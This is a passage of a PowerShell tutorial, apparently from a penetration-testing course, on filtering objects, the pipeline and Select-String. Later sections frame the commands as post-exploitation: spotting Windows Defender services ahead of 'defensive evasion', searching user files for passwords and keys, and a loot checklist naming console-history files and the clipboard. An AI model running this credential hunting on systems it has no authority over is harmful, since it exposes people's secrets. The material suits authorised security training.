    SID                    Property   System.Security.Principal.SecurityIdentifier SID {get;set;}
    UserMayChangePassword  Property   bool UserMayChangePassword {get;set;}
    

Now that we can see all of a user's properties let us look at what those properties look like when output by PowerShell. The [Select-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-object?view=powershell-7.2) cmdlet will help us achieve this. In this manner, we now understand what makes up a user object.

#### Property Output (All)

Finding & Filtering Content

    PS C:\htb> Get-LocalUser administrator | Select-Object -Property *
    
    
    AccountExpires         :
    Description            : Built-in account for administering the computer/domain
    Enabled                : False
    FullName               :
    PasswordChangeableDate :
    PasswordExpires        :
    UserMayChangePassword  : True
    PasswordRequired       : True
    PasswordLastSet        :
    LastLogon              : 1/20/2021 5:39:14 PM
    Name                   : Administrator
    SID                    : S-1-5-21-3916821513-3027319641-390562114-500
    PrincipalSource        : Local
    ObjectClass            : User
    

A user is a small object realistically, but it can be a lot to look at the output in this manner, especially from items like large `lists` or `tables`. So what if we wanted to filter this content down or show it to us in a more precise manner? We could filter out the properties of an object we do not want to see by selecting the few we do. Let's look at our users and see which have set a password recently.

#### Filtering on Properties

Finding & Filtering Content

    PS C:\htb> Get-LocalUser * | Select-Object -Property Name,PasswordLastSet
    
    Name               PasswordLastSet
    ----               ---------------
    Administrator
    DefaultAccount
    Guest
    MTanaka              1/27/2021 2:39:55 PM
    WDAGUtilityAccount 1/18/2021 7:40:22 AM
    

We can also `sort` and `group` our objects on these properties.

#### Sorting and Grouping

Finding & Filtering Content

    PS C:\htb> Get-LocalUser * | Sort-Object -Property Name | Group-Object -property Enabled
    
    Count Name                      Group
    ----- ----                      -----
        4 False                     {Administrator, DefaultAccount, Guest, WDAGUtilityAccount}
        1 True                      {MTanaka}
    

We utilized the `Sort-Object` and `Group-Object` cmdlets to find all users, `sort` them by `name`, and then `group` them together based on their `Enabled` property. From the output, we can see that several users are disabled and not in use for interactive logon. This is just a quick example of what can be done with PowerShell objects and the sheer amount of information stored within each object. As we delve deeper into PowerShell and dig around within the Windows OS, we will notice that the classes behind many objects are extensive and often shared. Keep these things in mind as we work with them more and more.

* * *

Why Do We Need to Filter our Results?
-------------------------------------

We are switching it up and using an example of get-service for this demonstration. Looking at basic users and information does not produce much in the way of results, but other objects contain an extraordinary amount of data. Below is an example of just a fragment from the output of Get-Service:

#### Too Much Output

Finding & Filtering Content

    PS C:\htb> Get-Service | Select-Object -Property *
    
    Name                : AarSvc_1ca8ea
    RequiredServices    : {}
    CanPauseAndContinue : False
    CanShutdown         : False
    CanStop             : False
    DisplayName         : Agent Activation Runtime_1ca8ea
    DependentServices   : {}
    MachineName         : .
    ServiceName         : AarSvc_1ca8ea
    ServicesDependedOn  : {}
    ServiceHandle       :
    Status              : Stopped
    ServiceType         : 224
    StartType           : Manual
    Site                :
    Container           :
    
    Name                : AdobeARMservice
    RequiredServices    : {}
    CanPauseAndContinue : False
    CanShutdown         : False
    CanStop             : True
    DisplayName         : Adobe Acrobat Update Service
    DependentServices   : {}
    MachineName         : .
    ServiceName         : AdobeARMservice
    ServicesDependedOn  : {}
    ServiceHandle       :
    Status              : Running
    ServiceType         : Win32OwnProcess
    StartType           : Automatic
    Site                :
    Container           :
    
    Name                : agent_ovpnconnect
    RequiredServices    : {}
    CanPauseAndContinue : False
    CanShutdown         : False
    CanStop             : True
    DisplayName         : OpenVPN Agent agent_ovpnconnect
    DependentServices   : {}
    MachineName         : .
    ServiceName         : agent_ovpnconnect
    ServicesDependedOn  : {}
    ServiceHandle       :
    Status              : Running
    ServiceType         : Win32OwnProcess
    StartType           : Automatic
    Site                :
    Container           :
    
    <SNIP>
    

This is way too much data to sift through, right? Let us break it down further and format this data as a list. We can use the command string `get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl` to change our output like so:

Finding & Filtering Content

    PS C:\htb> get-service | Select-Object -Property DisplayName,Name,Status | Sort-Object DisplayName | fl 
    
    <SNIP>
    DisplayName : ActiveX Installer (AxInstSV)
    Name        : AxInstSV
    Status      : Stopped
    
    DisplayName : Adobe Acrobat Update Service
    Name        : AdobeARMservice
    Status      : Running
    
    DisplayName : Adobe Genuine Monitor Service
    Name        : AGMService
    Status      : Running
    <SNIP>
    

This is still a ton of output, but it is a bit more readable. Here is where we start asking ourselves questions like do we need all of this output? Do we care about all of these objects or just a specific subset of them? What if we wanted to determine if a specific service was running, but we needed to figure out the specific Name? The [Where-Object](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.2) can evaluate objects passed to it and their specific property values to look for the information we require. Consider this `scenario`:

**Scenario: We have just landed an initial shell on a host via an unsecured protocol exposing the host to the world. Before we get any further in, we need to assess the host and determine if any defensive services or applications are running. First, we look for any instance of \`Windows Defender\` services running.**

Using `Where-Object` (`where` as an alias) and the parameter matching with `-like` will allow us to determine if we are safe to continue by looking for anything with "`Defender`" in the property. In this instance, we check the `DisplayName` property of all objects retrieved by `Get-Service`.

#### Hunting for Windows Defender

Finding & Filtering Content

    PS C:\htb>  Get-Service | where DisplayName -like '*Defender*'
    
    Status   Name               DisplayName
    ------   ----               -----------
    Running  mpssvc             Windows Defender Firewall
    Stopped  Sense              Windows Defender Advanced Threat Pr...
    Running  WdNisSvc           Microsoft Defender Antivirus Networ...
    Running  WinDefend          Microsoft Defender Antivirus Service
    

As we can see, our results returned `several services running`, including Defender Firewall, Advanced Threat Protection, and more. This is both good news and bad news for us. We cannot just dive in and start doing things because we are likely to be spotted by the defensive services, but it is good that we spotted them and can now regroup and make a plan for defensive evasion actions to be taken. Although a quick example scenario, this is something as pentesters that we will often run into, and we should be able to spot and identify when defensive measures are in place. This example brings up an interesting way to modify our searches, however. Evaluation values can be beneficial to our cause. Let us check them out more.

### The Evaluation of Values

`Where` and many other cmdlets can `evaluate` objects and data based on the values those objects and their properties contain. The output above is an excellent example of this utilizing the `-like` Comparison operator. It will look for anything that matches the values expressed and can include wildcards such as `*`. Below is a quick list (not all-encompassing) of other useful expressions we can utilize:

#### Comparison Operators

**Expression**

**Description**

`Like`

Like utilizes wildcard expressions to perform matching. For example, `'*Defender*'` would match anything with the word Defender somewhere in the value.

`Contains`

Contains will get the object if any item in the property value matches exactly as specified.

`Equal` to

Specifies an exact match (case sensitive) to the property value supplied.

`Match`

Is a regular expression match to the value supplied.

`Not`

specifies a match if the property is `blank` or does not exist. It will also match `$False`.

Of course, there are many other [comparison operators](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_comparison_operators?view=powershell-7.2) we can use like, greater than, less than, and negatives like NotEqual, but in this kind of searching they may not be as widely used. Now with a `-GTE` understanding of how these operators can help us more than before (see what I did there), let us get back to digging into Defender services. Now we will look for service objects with a `DisplayName` again, like < something>Defender< something>.

#### Defender Specifics

Finding & Filtering Content

    PS C:\htb> Get-Service | where DisplayName -like '*Defender*' | Select-Object -Property *
    
    Name                : mpssvc
    RequiredServices    : {mpsdrv, bfe}
    CanPauseAndContinue : False
    CanShutdown         : False
    CanStop             : False
    DisplayName         : Windows Defender Firewall
    DependentServices   :
    MachineName         : .
    ServiceName         : mpssvc
    ServicesDependedOn  : {mpsdrv, bfe}
    ServiceHandle       :
    Status              : Running
    ServiceType         : Win32ShareProcess
    StartType           : Automatic
    Site                :
    Container           :
    
    Name                : Sense
    RequiredServices    : {}
    CanPauseAndContinue : False
    CanShutdown         : False
    CanStop             : False
    DisplayName         : Windows Defender Advanced Threat Protection Service
    <SNIP>
    

Our results above now filter out every service associated with `Windows Defender` and displays the complete properties list of each match. Now we can look at the services, determine if they are running, and even if we can, at our current permission level, affect the status of those services (turn them off, disable them, etc.). During many of the commands we have issued in the last few sections, we have used the `|` symbol to concatenate multiple commands we would usually issue separately. Below we will discuss what this is and how it works for us.

* * *

What is the PowerShell Pipeline? ( | )
--------------------------------------

In its simplest form, the [Pipeline](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pipelines?view=powershell-7.2) in PowerShell provides the end user a way to chain commands together. This chain is called a Pipeline and is also referred to as a pipe or piping commands together. With PowerShell handling objects the way it does, we can issue a command and then pipe (`|`) the resultant object output to another command for action. The Pipeline will interpret and execute the commands one at a time from left to right. We have done this in a few examples in the previous sections, so we are diving deeper into it here. As an example using the Pipeline to string commands together can look like this:

#### Piping Commands

Finding & Filtering Content

    PS C:\htb> Command-1 | Command-2 | Command-3
    
    Output from the result of 1+2+3  
    

`OR`

Finding & Filtering Content

    PS C:\htb> 
    Command-1 |
      Command-2 |
        Command-3  
    
    Output result from Pipeline
    

`OR`

Finding & Filtering Content

    PS C:\htb> Get-Process | Where-Object CPU | Where-Object Path |
         Get-Item   
    
    Output result from Pipeline  
    

Each way is a perfectly acceptable way to concatenate the commands together. PowerShell can interpret what you want based on the position of the (`|`) in the string. Let us see an example of using the pipeline to provide us with actionable data. Below we will issue the `Get-Process` cmdlet, `sort` the resultant data, and then measure how many `unique` processes we have running on our host.

#### Using the Pipeline to Count Unique Instances

Finding & Filtering Content

    PS C:\htb> get-process | sort | unique | measure-object
    
    Count             : 113  
    

As a result, the pipeline output the total count (`113`) of unique processes running at that time. Suppose we break the pipeline down at any particular point. In that case, we may see the process output sorted, filtered for unique instances (no duplicate names), or just a number output from the `Measure-Object` cmdlet. The task we performed was relatively simple. However, what if we could harness this for something more complex, like sorting new log entries, filtering for specific event log codes, or processing large amounts of data (a database and all its entries, for example) looking for specific strings? This is where Pipeline can increase our productivity and streamline the output we receive, making it a vital tool for any sysadmin or pentester.

### Pipeline Chain Operators ( `&&` and `||` )

_Currently, Windows PowerShell 5.1 and older do not support Pipeline Chain Operators used in this fashion. If you see errors, you must install PowerShell 7 alongside Windows PowerShell. They are not the same thing._

You can find a great example of installing PowerShell 7 [here](https://www.thomasmaurer.ch/2019/07/how-to-install-and-update-powershell-7/) so that you can use many of the new and updated features. PowerShell allows us to have conditional execution of pipelines with the use of `Chain operators`. These operators ( `&&` and `||` ) serve two main functions:

*   `&&`: Sets a condition in which PowerShell will execute the next command inline `if` the current command `completes properly`.
    
*   `||`: Sets a condition in which PowerShell will execute the following command inline `if` the current command `fails`.
    

These operators can be useful in helping us set conditions for scripts that execute if a goal or condition is met. For example:

**Scenario:** Let's say we write a command chain where we want to get the content within a file and then ping a host. We can set this to ping the host if the initial command succeeds with `&&` or to run only if the command fails `||`. Let's see both.

In this output, we can see that both commands were `successful` in execution because we get the output of the file `test.txt` printed to the console along with the results of our `ping` command.

#### Successful Pipeline

Finding & Filtering Content

    PS C:\htb> Get-Content '.\test.txt' && ping 8.8.8.8
    pass or fail
    
    Pinging 8.8.8.8 with 32 bytes of data:
    Reply from 8.8.8.8: bytes=32 time=23ms TTL=118
    Reply from 8.8.8.8: bytes=32 time=28ms TTL=118
    Reply from 8.8.8.8: bytes=32 time=28ms TTL=118
    Reply from 8.8.8.8: bytes=32 time=21ms TTL=118
    
    Ping statistics for 8.8.8.8:
        Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
    Approximate round trip times in milli-seconds:
        Minimum = 21ms, Maximum = 28ms, Average = 25ms
    

With this output, we can see that our pipeline `closed` itself after the `first` command since it executed adequately, printing the output of the file to the console.

#### Stop Unless Failure

Finding & Filtering Content

    PS C:\htb>  Get-Content '.\test.txt' || ping 8.8.8.8
    
    pass or fail
    

Here we can see that our pipeline executed `completely`. Our first command `failed` because the filename was typed wrong, and PowerShell sees this as the file we requested does not exist. Since the first command failed, our second command was executed.

#### Success in Failure

Finding & Filtering Content

    PS C:\htb> Get-Content '.\testss.txt' || ping 8.8.8.8
    
    Get-Content: Cannot find path 'C:\Users\MTanaka\Desktop\testss.txt' because it does not exist.
    
    Pinging 8.8.8.8 with 32 bytes of data:
    Reply from 8.8.8.8: bytes=32 time=20ms TTL=118
    Reply from 8.8.8.8: bytes=32 time=37ms TTL=118
    Reply from 8.8.8.8: bytes=32 time=19ms TTL=118
    
    <SNIP>
    

The `pipeline` and `operators` that we used are beneficial to us from a time-saving perspective, as well as being able to quickly feed objects and data from one task to another. Issuing multiple commands in line is much more effective than manually issuing each command. What if we wanted to search for `strings` or `data` within the contents of files and directories? This is a common task many pentesters will perform while enumerating a host that they have gained access to. Searching with what is natively on the host is a great way to maintain our stealth and ensure we are not introducing new risks by bringing tools into the user environment.

* * *

Finding Data within Content
---------------------------

Some tools exist, like `Snaffler`, `Winpeas`, and the like, that can search for interesting files and strings, but what if we `cannot` bring a new tool onto the host? How can we hunt for sensitive info like credentials, keys, etc.? Combining cmdlets we have practiced in previous sections paired with new cmdlets like `Select-String` and `where` is an excellent way for us to root through a filesystem.

[Select-String](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2) (`sls` as an alias) for those more familiar with using the Linux CLI, functions much in the same manner as `Grep` does or `findstr.exe` within the Windows Command-Prompt. It performs evaluations of input strings, file contents, and more based on regular expression (`regex`) pattern matching. When a match is found, `Select-String` will output the matching `line`, the `name` of the file, and the `line number` on which it was found by default. Overall it is a flexible and helpful cmdlet that should be in everyone's toolbox. Below we will take our new cmdlet for a test drive as we look for information within some interesting files and directories that should be paid attention to when enumerating a host.

### Find Interesting Files Within a Directory

When looking for interesting files, think about the most common file types we would use daily and start there. On a given day, we may write text files, a bit of Markdown, some Python, PowerShell, and many others. We want to look for those things when hunting through a host since it is where users and admins will interact most. We can start with `Get-ChildItem` and perform a recursive search through a folder. Let us test it out.

#### Beginning the Hunt

Finding & Filtering Content

    PS C:\htb> Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse 
    
     Directory: C:\Users\MTanaka\Desktop\notedump\NoteDump
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a---           4/26/2022  1:47 PM           1092 demo notes.md
    -a---           4/22/2022  2:20 PM           1074 noteDump.py
    -a---           4/22/2022  2:55 PM          61440 plum.sqlite
    -a---           4/22/2022  2:20 PM            375 README.md
    <SNIP>
    

We will notice that it quickly returns way too much information. Every file in every folder in the path specified was output to our console. We need to trim this down a bit. Let us use the condition of looking at the `name` for specific `filetype extensions`. To do so, we will pipe the output of Get-ChildItem through the `where` cmdlet to filter down our output. Let's test first by searching for the `*.txt` filetype extension.

#### Narrowing Our Search

Finding & Filtering Content

    PS C:\htb> Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt")}
    
    Directory: C:\Users\MTanaka\Desktop
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a---          10/11/2022  3:32 PM            183 demo-notes.txt
    -a---            4/4/2022  9:37 AM            188 q2-to-do.txt
    -a---          10/12/2022 11:26 AM             14 test.txt
    -a---            1/4/2022 11:23 PM            310 Untitled-1.txt
    
        Directory: C:\Users\MTanaka\Desktop\win-stuff
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a---           5/19/2021 10:12 PM           7831 wmic.txt
    
        Directory: C:\Users\MTanaka\Desktop\Workshop\
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -----            1/7/2022  4:39 PM            945 info.txt
    

This worked much more efficiently. We only returned the files that matched the file type `txt` because of our filter's `$_.Name` attribute. Now that we know it works, we can add the rest of the file types we will look for using an `-or` statement within the where filter.

#### Using `Or` To Expand our Treasure Hunt

Finding & Filtering Content

    PS C:\htb> Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}
    
     Directory: C:\Users\MTanaka\Desktop
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a---          10/11/2022  3:32 PM            183 demo-notes.txt
    -a---          10/11/2022 10:22 AM           1286 github-creds.txt
    -a---            4/4/2022  9:37 AM            188 q2-to-do.txt
    -a---           9/18/2022 12:35 PM             30 notes.txt
    -a---          10/12/2022 11:26 AM             14 test.txt
    -a---           2/14/2022  3:40 PM           3824 remote-connect.ps1
    -a---          10/11/2022  8:22 PM            874 treats.ps1
    -a---            1/4/2022 11:23 PM            310 Untitled-1.txt
    
        Directory: C:\Users\MTanaka\Desktop\notedump\NoteDump
    
    Mode                 LastWriteTime         Length Name
    ----                 -------------         ------ ----
    -a---           4/26/2022  1:47 PM           1092 demo.md
    -a---           4/22/2022  2:20 PM           1074 noteDump.py
    -a---           4/22/2022  2:20 PM            375 README.md
    

Our string worked, and we are now retrieving `multiple filetypes` from Get-ChildItem! Now that we have our list of interesting files, we could turn around and `pipe` those objects into another cmdlet (`Select-String`) that searches through their content for interesting strings and keywords or phrases. Let us see this in action.

#### Basic Search Query

Finding & Filtering Content

    PS C:\htb> Get-ChildItem -Path C:\Users\MTanaka\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"
    
    CFP-Notes.txt:99:Lazzaro, N. (2004). Why we play games: Four keys to more emotion without story. Retrieved from:
    notes.txt:3:- Password: F@ll2022!
    wmic.txt:67:  wmic netlogin get name,badpasswordcount
    wmic.txt:69:Are the screensavers password protected? What is the timeout? good use: see that all systems are
    complying with policy evil use: find systems to walk up and use (assuming physical access is an option)
    

Keep in mind, Select-string is `not` case sensitive by default. If we wish for it to be, we can feed it the -CaseSensitive modifier. Now we will combine our original file search with our content filter.

#### Combining the Searches

Finding & Filtering Content

    PS C:\htb> Get-Childitem –Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | where {($_. Name -like "*.txt" -or $_. Name -like "*.py" -or $_. Name -like "*.ps1" -or $_. Name -like "*.md" -or $_. Name -like "*.csv")} | sls "Password","credential","key","UserName"
    
    New-PC-Setup.md:56:  - getting your vpn key
    CFP-Notes.txt:99:Lazzaro, N. (2004). Why we play games: Four keys to more emotion without story. Retrieved from:
    notes.txt:3:- Password: F@ll2022!
    wmic.txt:54:  wmic computersystem get username
    wmic.txt:67:  wmic netlogin get name,badpasswordcount
    wmic.txt:69:Are the screensavers password protected? What is the timeout? good use: see that all systems are
    complying with policy evil use: find systems to walk up and use (assuming physical access is an option)
    wmic.txt:83:  wmic netuse get Name,username,connectiontype,localname
    

Our commands in the pipeline are getting longer, but we can easily clean up our view to make it readable. Looking at our results, though, it was a much smoother process to feed our file list results into our keyword search. Notice that there are a few `new` additions in our command string. We added a line to have the command continue if an error occurs (`-ErrorAction SilentlyContinue`). This helps us to ensure that our entire pipeline stays intact when it happens along a file or directory it cannot read. Finding and filtering content can be an interesting puzzle in and of itself. Determining what words and strings will produce the best results is an ever-evolving task and will often vary based on the customer.

### Helpful Directories to Check

While looking for valuable files and other content, we can check many more valuable files in many different places. The list below contains just a few tips and tricks that can be used in our search for loot.

*   Looking in a Users `\AppData\` folder is a great place to start. Many applications store `configuration files`, `temp saves` of documents, and more.
*   A Users home folder `C:\Users\User\` is a common storage place; things like VPN keys, SSH keys, and more are stored. Typically in `hidden` folders. (`Get-ChildItem -Hidden`)
*   The Console History files kept by the host are an endless well of information, especially if you land on an administrator's host. You can check two different points:
    *   `C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`
    *   `Get-Content (Get-PSReadlineOption).HistorySavePath`
*   Checking a user's clipboard may also yield useful information. You can do so with `Get-Clipboard`
*   Looking at Scheduled tasks can be helpful as well.

These are just a few interesting places to check. Use it as a starting point to build and maintain your own checklist as your skill and experiences grow.
